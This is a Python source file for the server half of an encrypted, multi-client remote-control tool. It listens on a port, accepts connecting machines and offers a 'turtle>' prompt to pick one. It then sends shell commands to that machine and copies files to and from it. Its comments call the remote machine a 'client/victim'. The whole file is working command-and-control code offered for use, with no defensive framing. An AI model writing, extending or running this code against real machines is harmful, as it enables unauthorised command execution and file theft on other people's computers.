# Some code written by prasanna
# Basic code written by a youtube channel guy i forgot but credits goes to him :)
import socket
import sys
import os
import threading
import time
from queue import Queue
from cryptography.fernet import Fernet
file_path_to_read_and_write = os.path.abspath(".0903e3ddsda334d3.dasd234342.;sfaf'afafaf[a]]fasd.one")
# Keys and password for authentication and connection
def data_loader():
    arr = []
    file = open(file_path_to_read_and_write,"r")
    for i in file.readlines():
        i = i.replace("\n","")
        if i=="\n":
            pass
        else:
            arr.append(i)
    file.close()
    del file
    return arr[0],arr[1],arr[2]
send_password,recv_password,key = data_loader()

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# Encrypts content and send it
# Send data length and data
def sender(conn,data):
    encryptor = Fernet(key)
    encrypted_data = encryptor.encrypt(data.encode())
    encrypted_data_len = str(sys.getsizeof(encrypted_data.decode()))
    encrypted_data_len = encryptor.encrypt(encrypted_data_len.encode())
    conn.send(encrypted_data_len)
    time.sleep(0.1)
    conn.send(encrypted_data)

# Receives data and decrypt it
# Receive data length and data
def receiver(conn):
    data_len = conn.recv(10200)
    decryptor = Fernet(key)
    data_len = int(decryptor.decrypt(data_len).decode())
    data = conn.recv(data_len)
    data = decryptor.decrypt(data).decode()
    del data_len,decryptor
    return data
# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "0.0.0.0"
        port = 7689
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
            ps = receiver(conn)
            if ps == send_password:
                sender(conn,recv_password)
            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list' or cmd == 'ls':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'exit' == cmd:
            quit()

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            sender(conn,' ')
            receiver(conn)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit' or cmd == 'exit':
                break
            elif cmd == 'filetransferinitiate':
                type_of_transfer = input("Enter type of transfer(from,to)(target,u): ")
                type_of_transfer = type_of_transfer.split(",")
                if type_of_transfer[0] == "target":
                    path = input('From Path: ')
                    to = input('To Path: ')
                    sender(conn,"filetransferfromu12344")
                    sender(conn,path)
                    length = int(conn.recv(200000).decode())
                    ar = conn.recv(length)
                    fil = open(to,"wb")
                    fil.write(ar)
                    fil.close()
                    print("received")
                    del fil,ar,to
                    
                elif type_of_transfer[1] == "target":
                    t_path = input("To Path: ")
                    f_path = input("From Path: ")
                    sender(conn,"filetransferfromus12344")
                    sender(conn,t_path)
                    fi = open(f_path,"rb")
                    a = fi.read()
                    conn.send(str(len(a)).encode())
                    time.sleep(0.2)
                    conn.send(a)
                    fi.close()
                    print("sent")
                    print(">", end="")
                    del a,fi
                    


            elif len(str.encode(cmd)) > 0:
                sender(conn,cmd)
                client_response = receiver(conn)
                print(client_response, end="")
                
                
        except Exception as msg:
           print("Error sending commands",msg)
           break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()